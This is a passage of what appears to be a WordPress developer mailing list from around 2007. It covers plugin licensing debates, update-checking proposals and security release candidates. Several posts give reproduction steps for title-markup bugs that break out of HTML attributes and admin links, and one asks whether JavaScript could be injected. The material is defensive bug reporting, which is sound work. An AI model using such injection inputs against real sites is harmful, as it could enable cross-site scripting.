you agree with their view on WP Plugin Licenses, does that actually also
apply to the themes? I'd think that's a separate process altogether...

If it does, then that's mixed news: People using those themes can now do the
same thing they do to the default blogroll: throw it away.

On the other hand, this means that you can't legally require someone you
hired to theme up your website NOT to release his work again for free.....
Kinda makes a "original" design impossible.

at least publishing a single XML file with all the details about the

I would personally not want to limit plugin authors to ONLY using  
wp-plugins.org, as some have said, some people are happy to host the  
plugin themselves..

Thats a show-stopper for some, Not all code is going to be GPL'd, I think  
its best that non-GPL'd code stay off wp-plugins.org, but if an update  
plugin is to be created, it needs to be supported by the majorityof the  
plugin developer userbase, if some people are locked out from using it,  
then thats a bad thing.
Perhaps the new plugin host section can have a part added for "External  
Plugins", Basically no code is hosted by wp-plugins, and they only list  
the plugin for sake of searching, Download links information pages, etc,  
all redirects the user to the plugin authors webpage?

I mentioned this earlier in the piece,
I feel that that should be the method followed:

IF update uri specified, Contact uri, get update information
	(Prevent automatic updates? -- if implemented)
ELSE IF contact wp-plugins.org to see if listed, Get update information
ELSE plugin update uri not specified, Not included in wp-plugins.org,
Report as Unsuported.

If WordPress doesnt allow for external update urls, then it may lead to  
some plugins having to implement their own update system, pointless  
duplicating resources.

No offence intended to anyone who had attempted this.
But yours is probably the 2nd one out of 10+ which i've seen thats

That may well be useful, You've recently been working on this idea, I'm  
sure your input would be appreciated by both myself and anyone else.

I'm going to write up a application now for GGoC for a plugin to  
search/integrate/install from wp-plugins.org/

I just to add that the "the whole purpose of using one DBMS over another"
phrase isn't true.

When I was with a company and we spent 6 months trying all RDBMS until we
picked Oracle, the reason wasn't because of Oracle's non-ANSI-compliant
functions nor because of the different SQL Queries Oracle takes that MySQL
and MSSQL don't.

All the non-ANSI functions present in any RDBMS aren't necessarily the
best/most efficient/recommended way of doing things. There are dozens of
blogging platforms for MySQL out there that don't use all these proprietary
functions.

As for the work required, I think it's ridiculous to shoot down an idea just
because it takes some work - and it's that much in reality. Dave and I have
been working on his port for pgSQL, and there isn't that much quantity of
code that needs to be changed. Even if it took 3 months of coding to get an
alpha version out for a WP-multi-DB system, wouldn't that be worth it?

As for the plugin business - that's perfectly true. You can't force plugin
authors to write generic SQL, but when you think about it, a quick
compat-layer bundled with WP would take care of that, and you can force them
to use it too.

Lol, I agree.

But that's talking about pure originality. But imagine if every time
Microsoft hired a company to do its homepage, Apple had a right to use the
same exact design? (OR the other way if you like)..

If you only touch the database in one point (say, in db.php), it can be 
made pluggable; all one needs to do is implement the database API for 
their DBMS of choice, using the whole feature set they need, not ANSI 
SQL. This is different from using a generic database access layer like 
adodb or creole. And I consider it extremely bad practice to have SQL 
guts scattered all over, especially in plugins, anyway.

So, as I see it, Wordpress should support MySQL by default, but allow 
for people to provide alternative implementations. It is doable, and as 
far as I've seen there is an ongoing process of cleaning up the mess and 
replacing SQL code with API calls, so the future looks good :P

I've never suggested my work is too good to "give away".  I have a 
family to feed, and need to recoup something on my time (I thank the 
people who DO 'donate', but it's too small, too far between).  I don't 
mind GPL terms.  I prefer LGPL in general though, and my own major 
plugins are all just 'non-commercial-use licensed'.

The opinion of the FSF is just an opinion.  It is not part of the GPL as 
language (though I heard newer GPL might start to delve into such 
topics).  The GPL is describing compiled code, and in fact code that has 
a very particular threshhold of integration.  It does not specifically 
cover 'plugins' for a web/interpreted language like PHP, or the issues 
therein, it does not cover with any level of specificity at what point a 
plugin would NOT have to be GPL (for instance, a photoshop-esque plugin 
is given a pointer to a memory/image buffer, and says 'go'...  I don't 
call that tight integration of internal structures and functions!).

I'm thankful for WP.  I've also contributed more than my share back over 
the years, and I'm not one of the many gainfully employed by it.  In the 
early days I tried to do more debugging/improvement side, now I'm lucky 
if I have time to help answer Qs in the forums! ;)  I have a number of 
plugins which I should go and put up in wp-plugins, as they're small 
enough, yet useful enough, that I'm happy to just share them.

But I also pretty early on separated my major plugins into a 'core' and 
a 'plugin stub'.  The core, in general, doesn't know a freaking thing 
about WP, could care less, could be integrated into any number of 
PHP-based systems.  For those without that separation, some of them have 
a tight integration, some of them don't.  Some might have example files 
of how one might more tightly integrate with a particular PHP system, 
like WP.

<soapbox>I also dislike some of the holier-than-thou I hear from 
GPL-ites who are either being paid to do their work (many of the 
significant GPL projects are by paid corporate staff or educational 
faculty), or significantly benefitting from it via other secondary 
means.  (That isn't to point at you Matt, I have no idea whether or any 
of the Automattic team have made money directly or indirectly off of 
WP... or what salaries you make... etc.)</soapbox>

And back to the original points someone made: I have no problem having 
my plugins hosted somewhere other than my server.  I'm not a control 
freak.  The code is PHP, it's all readable, if someone wanted to 
steal/lift from it they probably already have.  I just obviously can't 
host most of them on a GPL-only service.  So having a plugin manager, 
plugin checker, whatever, that only supports the GPL-only service is bad 
in my eyes, shortsighted, and actually a bit of a slap in the face...

I have to agree here.
I develop free software and distribute it under my proprietary free software
license. Some is open source, some isn't.

But the fact of the matter is, my softwares have been downloaded several
million times, and if I relied on donations for bread and butter, I'd have
neither.

Thank god for real work.

If anyone is interested in using WordPress as a full OpenID consumer, I've
just released a plugin that will do just that.  It's performed fine in all
of the tests I've run, but this is my first public plugin, so I'd love
feedback if anyone tries it out.

I'm +1 on GPL-only (or GPL-compatible) in the official repositories. 

Users should not have to consider a bunch of legaleese before using
software. The GPL may be a restrictive license among the Open-Source
ones, but it still makes it possible to modify and share software
without limitations. That's what makes Free Software popular.

And: If you restrict commercial use, then what will happen? People will
download and use it commercially anyway, if they want. (Yet they won't
spread the word about it.) And what are you going to do about it? If
you're in the same country, and you have plenty of time and a good
lawyer, you can start a lawsuit. Elsewise -- you just sit and watch.

As for putting food on the table: I publish my plugins under the GPL, I
even refuse to take donations. But the users of my plugins spread the
word, and that's very good PR for me. So good that I sometimes have to
reject requests for new projects (as much as it hurts). And if a
competitor takes my software and earns money with it, so what? I am well
off, and I see no reason for wasting my nerves with complaining. By the
way, my experience shows that some of them even come to me in the end,
and ask me to improve the plugin for special purposes.

Besides, what happen if Matt and Automattic would put WordPress itself
under a non-commercial license, forbidding to earn money from plugins?
You see, you couldn't earn money with proprietary plugins, if WordPress
itself was proprietary.

We should be happy that WordPress is free software, and what WordPress
provides for us with the provisions of the GPL, we should also give to
others.


Best regards,
Alex

What about people who publish their Plugins as even MORE relaxed? BSD?
Apache? That doesn't fit in your reasoning for GPL-only.

Congratulations, and lucky you. I only wish it were the same for me :) But
the fact of the matter is, it's not and for most people it's the same thing.

You *can't* forbid people from earning money with Plugins. Look at Windows:
it's proprietary, but that doesn't make it illegal to develop software for
Windows!?!

We are. Very happy. But as far as providing for others go, I say do what
your capable of. If it's in your capacity to provide free software, well and
good. And if it's not???


BTW, the FSF opinion on Plugins for GPL software is ridiculous and flawed.
Here's the real logic:

I MUCH prefer the GPL license to the Apache license as far as
developer-protection. But when coding open-source for myself or independent
projects, I choose Apache over GPL anyday because the Apache Foundation
doesn't act like dictators demanding the world switch to GPL left and right.


But that's just my two cents. I'm not a big name in GPL or open source
development, what do I know...

Is it active on our own blog? What inspired you to build your own?

I run Wordpress OpenID Plugin+ in "unobtrusive mode", I think that is
a simple, elegant experience.

The Windows EULA does (afaik) not make any specifications about the
licenses of drivers and applications. The GPL allows distribution of
non-GPL with GPL software, as long you don't "link" against the GPLed
software. However: technically, you don't do linking in a WordPress
plugin, but you use the WordPress API, which means that you use internal
functions of a GPLed application -- which in return requires your
application to be distributed under the GPL, too. I would agree that
this doesn't apply when you distibute your plugin without WordPress and
would let the user do the installation ("linking" in terms of the GPL).

I also think that this situation is similar to what is being discussed
with proprietary Linux kernel modules currently. As for me, I agree with
those who say that non-GPL-compliant kernel modules are not legal. As
soon as you use internal functions of another application or library,
you're linking. And as soon as your application does the linking and you
want to distribute it with the original distribution, it must GPL.

For non-GPL-compliant plugins, this means: You may offer the plugin as a
download (no matter under what license), and you may demand money for
the plugin itself. But you must not install WordPress for a customer
with your proprietary plugin.

I agree with all four points, yet you seem to misunderstand the last
one. You are allowed to distribute non-GPL-compliant software with GPLed
one, as long it's just about bundeling. Quoting the GPL: "... mere
aggregation of another work not based on the Program with the Program
(or with a work based on the Program) on a volume of a storage or
distribution medium does not bring the other work under the scope of
this License."

It's not currently active on my site, I just set up a demo install where
people can see what it adds to the login page (http://exid.dancoulter.com/).
Both the OpenID and Flickr editions of the plugin are running on that blog.


I originally had use for the Flickr version of this plugin for an upcoming
community site for a Flickr group I'm in.  I wanted the other people to be
able to authenticate into WordPress with their Flickr user accounts.  Once I
got all the hooks figured out, it was pretty simple to port it to OpenID
(which I'm a pretty big fan of).

My plugin is designed more for full users of WordPress, not for commenting.
I wanted to be able to make my WordPress installs consumers of OpenID for
their login system.

Actually, what makes free software popular is that it is free. ;)  And,

they use.

That's an argument for software piracy.  "Eh, I don't want to pay for 
stuff I use, I'll use it anyway..."

If I restrict commercial use, 'good citizens of the world' will properly 
contact me and request a paid commercial license.  NOTE THAT AKISMET 
DOES THAT!  WOW!  Unheard of! ;) ;)

Great for you that you refuse money people want to give you.  And, I see 
you run a consulting company that specializes in OSS.  Great you can do 
that and earn a living, and afford to turn away money.  I can't earn a 
living off my OSS work, and I don't turn down donations.

Also, I find as much as people say those of us in the US don't think 
enough of the rest of the world, some of the rest of the world forgets 
that the cost of living vs cost of earnings in many areas of the States 
(and certain other countries) can make certain jobs 'unviable' in those 
regions.  I'm in one of those regions.  And I'm not looking to 'build 
PR' from my plugins, get more work from my plugins, so again, great for 
you but doesn't help me a bit. ;)

Depending on the origination of the project, they could do a commercial 
version.  Many OSS projects have commercial versions with added features 
and support.  But, an open plugin system is an open plugin system -- 
they'd have to lock out plugins, have the code precompiled so a 
purchaser can modify it, etc.

I have had my plugins free for years for personal use.  I've been a 
large contributor to the support forums for years.  I give to others.  
But I can't depend on my (few but thankful!) donations.  Would making my 
plugins free and clear in GPL get me more users, more donations?   Maybe 
a tiny bit.  But switching to a completely paid-use license on my big 
plugins would make me a lot more (as those users have proven they're 
actively willing to pay for features).

I guess we're in agreement then...

I don't distribute nor install WP so that my Plugins would work (not that I
have any non-GPL WP Plugins for that matter), and the FSF can't force my
(non-existent) plugins to be GPL.

Keeping this in mind, how would be it wrong for FREE but non-GPL Plugins to
be distributed via the Repo?

Do you mean free as in "free beer" or free as in "free speech"?

Yes, but it all goes through a single filter in db.php, it'd be 
interesting to see if some sort of query rewriting could address the 
majority of the cases that cause problems.

Beer of course.

I have my own license I use for my free stuff (not WP, which I use GPL for),
and it's basically Creative Commons for software... Totally free, just to my

I think we're all addressing two separate concerns here:

1) Licensing for that which gets hosted on wp-plugins.org
2) Licensing for plugins listed in the "update beacon".

I say that GPL-only is fine for #1, as that's the stricture that
Automattic has placed on hosting stuff on their gear, as is their
right.

I say that, if we do any sort of external notification for code hosted
outside of wp-plugins, we add a "License" field to the readme.txt (or
whatever) that consists of one of a few enumerated "safe" license
types - Apache, BSD-style, CC, whatever.

In our formatted readme.txt, we ought to have a "download URL" or
similar REGARDLESS of whether a plugin is hosted on wp-plugins or not.
 This way, a non-GPL (or non wp-plugin-hosted) plugin COULD create a
project on wp-plugins that simply consisted of a readme.txt (whose
license would obviously have to be GPL, although I'm not quite sure
what that would even mean).  The update checker on each WP install
would query the readme.txt's of the plugins it was concerned with and
then proceed to the URL listed.  If it's on wp-plugins.org, much the
better.  If it's on foo.bar.example.com, pull it from there.

Make sense?

That and disability checks which allow me to do some of that stuff
that I can give away for free. :)

Would be nice if the donations were a bit more though...

I released a program once that, in addition to being GPL'ed, required
upon installation the installer drop me an email.  I just wanted to
know where it was being used.

A google search pulled up about 250 installs.  I got one email. :(

Sounds great :)

That's exactly what I'd like to see as a matter of fact :)

I had a update-beacon system for WP 1.5 a long time ago now, it was a
de-centralized update system that relied on plugin authors publishing their
own update feeds according to a standard - that way licenses play
absoloutely no role in that matter, but I think a WP-hosted update beacon
servicing only free code sounds ideal.

Same as the readme.txt feature for wp-plugin listing of non-hosted code,
dev. could use that (GPL'd Readme.txt) to trigger an update beacon alert,
etc....

Could you reply off list and let me know what conditions you got that error
under? (WP Version, what you filled in the field? What version of the OpenID
Spec your provider is using)

My guess is that the class I'm using didn't recognize the server as a valid
OpenID provider.  If it's a problem with the class, I can easily replace it.

I hear you, feel your pain.  People hear "free" or "GPL", and many don't 
think twice about reading the readme, the license file, etc.

the first thing that comes to my mind is some sort of table lookup for 
queries (have a list of problematic queries and get templates for them 
from an associative array, let the others through unaltered), but it's 
quite a hack :)

the real solution is moving queries into the database API.

Uh oh, I think there are greater problems afoot at wp-plugins.org, as
I can't seem to run an 'svn up' for any of my WP blogs, as they call
out to wp-plugins.org for akismet externals.

How is it compatible only one way? You can put GPL code in BSD-3  
software, and BSD-3 code in GPL software. In neither case does the  
license change (it both remains either GPL/BSD, as unless you are the  
copyright holder, you cannot change the license, unless permission is  
explicitly granted).

Because GPL is viral and the FSF says you can't stick it in a BSD repo
without infecting the entire BSD project with the GPL.

What?

"In addition, mere aggregation of another work not based on the Program with the
Program (or with a work based on the Program) on a volume of a storage or
distribution medium does not bring the other work under the scope of this License."

Hi all,

A slightly OT question but related to the wp-plugins.org hosting.

While I can access the SVN using http://svn.wp-plugins.org/ using
svn://svn.wp-plugins.org/ doesn't work. Unfortunately the second url
format is required to use SVN from within the kde filesystem (vs.
using a seperate program). Is there any obvious reason that svn://
protocol wouldn't work to the wp-plugins.org SVN server?

Thanks,

Martin

Yep, a very obvious one, svnserve must be running to use the svn:// protocol.

You may have luck asking someone to set up access via svn://, you may not.

Just a thought but if could be the SVN service/daemon is not run for  
security reasons. Many SVN sites install only the portion to allow  
SVN via port 80 (HTTP).  Having one does not always mean the other.   
Though they can both be run on the same server.

Thanks Robert (& Paul) that answers the question.  I can live without
it - everyone else appears to be managing just fine.  I'll just need
to spend a bit of time with the svn software - in the long run it
probably helps to know what's going on.

Thanks again,

Martin

Go read the GPL. You cannot place any _further_ restrictions  
contained within the GPL. You can have pieces of code released with  
_less_ conditions. As I've already said, you cannot change the  
license without the copyright holder's permission. The BSD license  
does not give that permission, therefore, it remains BSD licensed,  
and under your theory it is therefore GPL incompatible.

RC2 for both 2.0.10 and 2.1.3 is out.  The following bugs are fixed:

http://trac.wordpress.org/ticket/3979
http://trac.wordpress.org/ticket/3981

Also, some more attribute_escapes were added to a few places.

http://trac.wordpress.org/changeset/5046
http://trac.wordpress.org/changeset/5050

Areas that need testing are paging (posts_nav_link,
previous_posts_link, next_posts_link), xmlrpc uploading (for 2.1),
nonce AYS confirmations, and page on front (for 2.1).

Mark and I have been auditing the code and think we have found all
places where we should attribute_escape, but we could use some more
eyeballs.  Attributes that might contain user supplied content should
always receive attribute_escape treatment before being output.  This
includes $pagenow and PHP_SELF.  If you see any places where PHP_SELF
or $pagenow are being output, check to make sure they are being
properly escaped.  These should rarely be output by WP core, and
plugins and themes should probably avoid outputting them altogether.
Also, please give wp_nonce_ays() a thorough review.  This function has
been the source of many bugs.

Acunetix should run cleanly against the RCs.  If you have a
vulnerability scanner handy, run it against the RCs and let us know if
something pops up.

RC2 packages are available on the release archive page.

I believe there is a ticket regarding this in Trac, though last I recall it
hasn't been attended to. I'll see if I can dig up the ticket ID for you.

Possibly, http://wordpress.org/support/topic/68899 will help you,
otherwise I think you will probably have to roll your own as I have
not heard of a more thorough answer.

That script doesn't use RSS.  It uses straight database calls to the
PHPNUKE and WP installs.

He said "phpnuke", but maybe they are similar / the same thing?

Shazbot.  You are, of course, right.  Still, from what I know of php
vs. Post, they're largely similar, DB-wise.  Might not be too hard to
massage.

However, they claim that proprietary kernel modules are violating the GPL.

Yeah, I'm talking about the other way around.
You can put BSD code in a GPL project, but you can't put GPL code in a BSD
project.

Like Alex said, it's one-way compatible. Geoffrey was hinting at putting GPL
code in a BSD project and just calling that particular module GPL and using
it from the rest of the project (if I understood him correct), making it
two-way compatible.

But the FSF forbids this kind of behavior :)

Ok, interesting. Tried and I didn't see anything special (2.1).  
What's supposed to happen? Any documentation?

We've run across another issue:

http://trac.wordpress.org/ticket/3986

Basically, our attribute_escape() is not sufficient to protect content
that goes into href or src.  IE7, for one, will still interpret the
escaped content.  Mark and I just ran through the code and changed
href and src content to use clean_url() instead of attribute_escape().
 These changes are committed to trunk and the 2.1 branch. 2.0 is in
the works.  Please review and test.  After we shake out any obvious
screwups we will package RC3 for wider testing.

When you review the code, keep in mind how our various sanitizer
functions should be used.  js_escape() is used to sanitize JS code
that goes into onclick, etc.  clean_url() sanitizes content that goes
into an href, src, or redirect.  attribute_escape() escapes content
going into an attribute.  If you want to do some XSS testing, look
over the XSS cheat sheet.

I'd recommend an additional refactoring to introduce a single  
'wp_escape' function, or similar. The function would accept 2  
parameters, the string and the type of usage (js, attribute, url,  
etc.). Both params would be required with no default values to force  
people to use/set the right one.

It's not uncommon for folks to look through the source for a function  
they need and find/use the wrong one because it's the first the run  
across. A single function would help alleviate that. Of course we'd  
have to deprecate the old ones over time.

I'd be willing to cook up a patch for this if it would be accepted.

I disagree.

This leads to one big function which becomes harder to maintain.

This should be addressed by using comments in the code which describe 
what the function is to be used for.

A better solution, in my opinion, is to move all these security related 
escaping functions to a single file in wp-includes and document them 
well in that file.

I'd be willing to cook up a patch for this if it would be accepted.

To be honest I'm not sure. Entering an url with dav:// protocol starts
a search (locate:dav// ) rather than actually attempting to open
anything - but it may be that I need a valid url to test.

Someone with plugin directory know-how...

Having uploaded to the svn a few of my plugins are now available to
download. I notice that the downloads seem to use the format
pluginname.tag.zip so, for example, a version 1.2 plugin gets
pluginname.1.2.zip.

However, it's also possible to download with just pluginname.zip which
downloads a copy. Is this the latest tag (stable release) or the
trunk? And is there any way to download specifically the latest
release or trunk on the url?

It would useful when posting links elsewhere (e.g. on my own site) to
direct them to the latest version at all times - rather than re-edit
various pages on each release.

There is also a minor problem with the directory structure. When
packaged up tag 1.2 is put into a folder in the zip called
/pluginname.1.2 to match the zip.  Unfortunately a lot of plugins
(mine included) expect to be in a particular folder within the plugins
directory (e.g. just /wp-content/plugins/pluginname ).

If this is intended does anyone know of a good bug-free way for a
plugin to find where it's installed? I've tried in the past to do this
but users with weird subdomain hosting knackered even my most
complicated attempts.

Apart from that it's a great system & looking really good. I don't
know what I'm going to do with all ?3 of Adsense revenue now I don't
need to pay off my web host.

Thanks

Instead of one big function I would prefer one (static) class with
several (again static) methods, so you would use wp_escape::js($string),
wp_escape::url($string) etc. This way all the functions are kept in one
place, but it's easy to change one without messing with code that
effects the others - and you avoid large if...elseif...else blocks. WP
in my opinion make much more use of OOP anyhow (and strictly confirming
to a "one class/one function per file" rule would not hurt either, but
instead make "messing" with the core and updating later much easier).

Are you expecting to be in a certain folder to add a menu item?

It's for referencing images/etc. that are included in the plugin
package. Normally I can be fairly sure that the files would be in
~base/wp-content/plugins/plugin-name/images but with the current
folder format in the zips a user will end up with
~base/wp-content/plugins/plugin-name.x.x/images.

It looks as though it might make upgrading a bit more complicated also
- rather than overwriting, over time there would be folders for each
version (assuming people installing don't rename / copy the files
seperately).

Thanks,

while adding a menu item can be sorted out easily with dirname(__FILE__) 
or using a function to generate the page, having each release unpack 
under a different folder name adds some complexity to upgrades on the 
user side (delete old folder and repeat plugin activation et al, or 
rename the current one to remove version), and some added headaches on 
the support side (users that don't do the added actions because of 
various reasons, and I'm against attitudes like "I gave you this stuff, 
figure out how to use it yourself and don't bother me, or pay me to hold 
your hand" when the user's question is actually polite).

See 
http://www.elharo.com/blog/software-development/web-development/2007/03/17/a-strong-test-for-markup-in-titles-summaries/

In brief create a post with this string as the title:

A <strong style="color: green">Strong</strong> Test for Markup In Titles 
&amp; Summaries

Publish it and look at what WordPress puts out into the h1 header:

             <h1 class="single"><a 
href="http://www.elharo.com/blog/software-development/web-development/2007/03/17/a-strong-test-for-markup-in-titles-summaries/" 
rel="bookmark" title="Permanent Link: A <strong style="color: 
green">Strong</strong> Test for Markup In Titles &amp; Summaries">A 
<strong style="color: green">Strong</strong> Test for Markup In Titles 
&amp; Summaries</a></h1>

The the_title_rss() function behaves appropriately. The bad text is 
probably coming from the_title and single_post_title though I haven't 
verified that yet.

WordPress is stuffing the title text (including markup with < and > and 
") into a title attribute without sanitizing it first. I suspect I could 
reproduce this just by using the " and > characters in a title without 
explcitly putting tags into my title.

Possibly this is a theme bug, but if so I bet Kubrick has this bug since 
I don't think I ever changed that part of it. when building my own theme 
on top of it. Here's the relevant code from the theme:

<h2><a href="<?php the_permalink() ?>" rel="bookmark" title="Permanent 
Link to <?php the_title(); ?>"><?php the_title(); ?></a></h2>

I'm not sure if the problem is in the the_title function or if the theme 
should be calling a different function like the_title_rss (which 
apparently strips markup)

This has so far only been tested in 2.0.7.

Message-ID: <45FC3841.9090904@metalab.unc.edu>

The doc for the_title_rss currently states:

Displays the title of the current post, formatted for RSS. This tag must 
be within The Loop.

In my experiments it appears that even when the title field contains 
tags and entity references, the tags are stripped out and the entity 
references converted to numeric character references.

Can I count on this behavior? It would make it much easier to fix some 
tricky parts of the Atom 1.0 plug-in?

Same question for the_excerpt_rss? Is this guaranateed to be plain text 
aside from numeric character references?

What do these functions do with unescaped reserved characters such as & 
and < ?

I'm not averse to any of these suggestions, but I'm worried that
another round of changes might be a bit much to get done for 2.0.10
and 2.1.3.  Release of these is already way overdue.  Shall we stick
with what we have and work on a new way for 2.2?  The new way can then
be backported to 2.1 and 2.0 under less time sensitive conditions.

Yes.

These changes should not keep us from releasing the fixed versions - 
they are merely tidying up and neatening.

Because you are adding an unnecessary level of complexity to writing the 
function - which is just going to be a switch statement containing the 
code from the other functions.

Also, these functions are often called and so we should keep the 
argument list small.

It also doesn't mean that the user is going to pick the correct argument 
to pass to the functions either!

Also, in 2.1.2, if I put in <span style="color: #0099FF;">This is a
"Test"</span>, I get this:

<h2><a href="***************/this-is-a-test/" rel="bookmark"
title="Permanent Link to <span style="color: #0099FF;">This is a
&#8220;Test&#8221;</span>"><span style="color: #0099FF;">This is a
&#8220;Test&#8221;</span></a></h2>

(I added the asterisks, since I'll be deleting the post) But, and even
weirder thing is, for the title, I see:
This is a "Test"">This is a "Test"

Which is probably caused by the Browser (tested in IE7 and FF2) seeing ">
before the actual end of the link.

So, what goes into the title definitely needs to be sanitized. Wait, didn't
I see something about this, and that it's fixed in 2.1.3?

...and you can also have a dispatcher that calls self::whatever, with

that's rather modules/namespaces-like functionality than OOP; and it's 
much more useful than OOP in this case, too :)

one class/namespace/module/whatever != one function; hundreds of files 
with one function each are as hard to maintain as one file with hundreds 
of functions (actually harder, due to having to search for text in 
several files while looking for something, and having to have several 
files open when moving code around);

+ 1 for related functions gathered in classes (should I understand that 
a patch doing this would be accepted? :))
+ 1 for one class per file

Possibly, though I thought that was something different.

Part of the problem is that the documentation is insufficiently clear 
about what functions like the_title_rss and the-title do or don't do to 
the text before returning it.

I think what happens is that all text is stored in the database just as 
the user enters it in the forms (though I'm not certain about that) and 
that different functions escape or strip this text in different ways. It 
would be nice if the documentation specified how they do that. Even if I 
can figure this out by experiment, I'm still never quite sure what may 
change in the next release. Once a function's behavior is documented I'm 
confident that the programmer meant it to behave in a certain way, not 
that's merely an accident of implementation I shouldn't depend on.

I do more development on my production server than I'm comfortable with 
already. :-)

However it's not hard to test if anyone is running the latest RC or 
trunk. Just create a new post using the default theme with this title:

A <strong style="color: green">Strong</strong> Test for Markup In Titles 
&amp; Summaries

See what happens.

I tested it on the latest SVN from /branches/2.1/ and the problem is still
there. But, the_title_rss() does correct it. I don't see anything wrong with
using the_title_rss() in place of the_title() on the index (since it'll
still be in the loop). The only thing is, the_title_rss() doesn't have
before and after strings, but most themes don't use those (that I've seen,
at least).

But, what is really need is a function that will strip out HTML for output
to title or alt tags.

What I would ideally want is a little more general: a function that 
converts any HTML fragment to plain text+numeric character references by 
stripping out all tags and converting entity references to numeric 
character references.

There may well already be such a function in either PHP or WordPress 
since this seems to be exactly what the_title_rss and the_excerpt_rss 
already do. Hmm, looks like they're filters of some kind:

$ grep the_excerpt_rss wp-includes/*.php
wp-includes/default-filters.php:add_filter('the_excerpt_rss', 
'convert_chars');
wp-includes/default-filters.php:add_filter('the_excerpt_rss', 'ent2ncr', 8);
wp-includes/feed-functions.php:function the_excerpt_rss() {
wp-includes/feed-functions.php: echo apply_filters('the_excerpt_rss', 
$output);
$ grep the_title_rss wp-includes/*.php
wp-includes/default-filters.php:add_filter('the_title_rss', 'strip_tags');
wp-includes/default-filters.php:add_filter('the_title_rss', 'ent2ncr', 8);
wp-includes/default-filters.php:add_filter('the_title_rss', 
'wp_specialchars');

I haven't explored this part of WP before so I'm not quite sure what's 
going on.

I suspect what we really need are two families of functions:

the_title_with_markup (same as the current the_title)
the_title_without_markup (same as the current the_title_rss)

So we may not really need any API we don't have already. However the 
names of the functions are misleading theme developers (including the 
default theme). They are using the_title in some places where they 
should be using the_title_rss.

Same story for the_excerpt and perhaps some other functions I haven't 
noticed yet.

Message-ID: <000001c768e6$039ac570$0ad05050$@net>

I was messing about with my server (installed a new rewrite engine), and
restarted IIS.

 

I noticed my blog was taking a lot of time to load, so I refreshed.. It took
even longer.

 

I waited 2 or 3 secs for it to load, scrolled to the bottom, and read ONE
HUNDRED EIGHTY SEVEN queries - 2.1 seconds.

I refreshed a couple of times, and it became 187*2

Another ten or so refreshes: 187*4, etc...

 

After restarting IIS, restarting MySQL, disabling all plugins, switching to
the default theme, and tearing my head out I realized I hadn't cleared the
wp-content/cache folder. Lo and behold, my server was back to 38 queries per
display...

 

I don't use Gallir's WP-Cache, just the in-built object cache. After
clearing the cache everything is working again, and the cache is being
properly created.

 

I'm wondering if anyone has ever seen this kind of bizarre behavior before
from WP's object cache? I can't think of a logical explanation for what
happened.. 

 

WEIRD!

Quick question: if WP uses a hacked-up version of EzSQL, would it be
possible to implement, in the core, the decent caching system that was added
to the EzSQL script itself later on?

 

It's not like the WP-Cache plugin, and it's been tested to perfection.. It
works on all platforms and server setups.

That is interesting. I've worked with WPs object cache before but not 
enough to know what might have happened in your situation. I'll take a 
look at it later and see if there's also some way for us to prevent that 
  from happening again in the future.

I should add: I've been using WP Object Cache since the very beginning...
never had this problem on this same server and same config (I used to even
use this "new" rewrite engine in the past before switching to an
alternative)...

Actually, you can simulate static class variables so that they are directly accessible, IIRC.

class myclass {
  var $my_static_var;

  function myclass() {
   static $my_static_var;

   $this->my_static_var = & $my_static_var;
  }
}

Then:

$instance = new myclass();
echo $instance->my_static_var;

should work as expected, remaining static for each instance.  I prefer this method as it avoids the
overhead of a function call.  This still works for PHP5 too, though it's not required as you say.

(Disclaimer: written off the top of my head without a debugger in sight - some tweaking might be
necessary)

The last I heard, the static keyword is also going to be reused for very late static binding in
PHP6, where it will reference the calling class, rather than the class the code is executed inside.
 I don't know what the current status of this decision is, but it might be something to bear in mind
when using static/self for function calls in current projects...[1]

Cheers,

Jamie.

actually, if you search for "svn http kioslave" the first result is a 
bunch of C++ in a mail that contains exacty this; the generic way to 
specify such locations is fileprotocol+transportprotocol:// (there is 
also svn+ssh, for instance); kde doesn't know you are trying to browse a 
SVN repo if it only sees http:// (although it could make an educated 
guess, bzr-svn for instance first checks if there is a bzr branch at the 
URL, then looks for a SVN branch in a similar situation)

Lol, now I see what happened: It *automatically* changed the home and
siteurl. Alright. I also see that even WP 1.5.x had this feature.

Gotta spread the word now. ;)

Subject: [wp-hackers] Another bug as a result of markup in titles
Message-ID: <45FD287E.1090309@metalab.unc.edu>

Another bug caused by markup in titles and this one's theme independent.

Steps to reproduce:

1. Create a post with a title containing a link like this:

<a href="http://www.cafeaulait.org/">Is This a Security Issue?</a>

2. Go to your the dashboard; i.e. blog/wp-admin. In the sidebar look at 
the POSTS. The first post should now have a link like this:

<a href="http://www.cafeaulait.org/">Is This a Security Issue?</a>

That is, the link comes from the supplied title rather than the internal 
edit link for that post.

I've only verified this in 2.0.7. If someone can verify it in 
2.1.3/2.0.9 it would be worth filing a Trac.

I suspect the fix involves removing links, and probably all other markup 
from the title before sticking it in the posts sidebar on the admin page.

Still to be determined: are there other pages in the admin section that 
  need this treatment? Can one inject JavaScript into the admin pages in 
this fashion?

I can reproduce this in 2.1.3-RC2.

Btw, $wp_version is 2.1.3-RC1 in 2.1.3-RC2.

I think I saw some proposals to allow markup in titles in trac, and 
people were generally against it, I didn't manage to find where the 
shift in attitude occurred :)

Markup in titles and hyperlinks in titles aren't mutually inclusive.
Once in a while I use acronym or italic in my titles... But using hyperlinks is something totally different.....

Just a note... If someone proposes a fix for these bugs regarding 
markup in titles, please do not decide to fix it by stripping any HTML 
tags from titles before they are saved to the database. Some plugins 
use fake markup tags in titles and other text for filter indications. 
So the tags need to be saved along with the other title text, and are 
then filtered back out by the plugin before echoing into either the 
admin page or in the public page's HTML.

That said, probably links in titles are never going to work well, 
because most title displays in most themes are links (to the permalink 
of the article) or in the overall HTML page title (which can't be 
clicked on anyway) or in the admin pages (link to edit the article). 
So probably the fix would be to strip them out using a filtering 
function applied by default in WordPress.

I think it's simpler than that. I've fixed the bug on my own site simply 
by replacing a few calls to the-title with calls to the_title_rss. No 
pre or postfiltering required. (Presumably the_title_rss already does 
some postfiltering though better documentation would be nice.)

However, I'm now exploring what happens if the plain text contains 
quotes. Stay tuned.

I agree that some tags should be allowed in titles, such as em, acronym,
strong. Maybe KSES can be used for it. In any case, I think it is better
to allow a predefined set of tags and strip anything else, rather than
defining a set of tags to strip and preserve all other.

As for the fake tags of some plugins: It is unfortunate that these
plugins work this way; they should rather use something like square
brackets. Using pseudo-HTML for backend operations is almost always a
bad idea; if you do this anyway, you would need to mark it as CDATA and
be absolutely sure that it will not cause problems with interacting
functionalities. This is quite impossible with a post's title in
WordPress.

Near as I can tell it is only tags in the titles that cause the 
problems. I have not been able to force a bug using only plain text 
quotes marks and angle brackets. The brackets seem to be escaped and the 
quotation marks are converted into curly quotes.

I find trac/moinmoin wiki text much easier to read and use than 
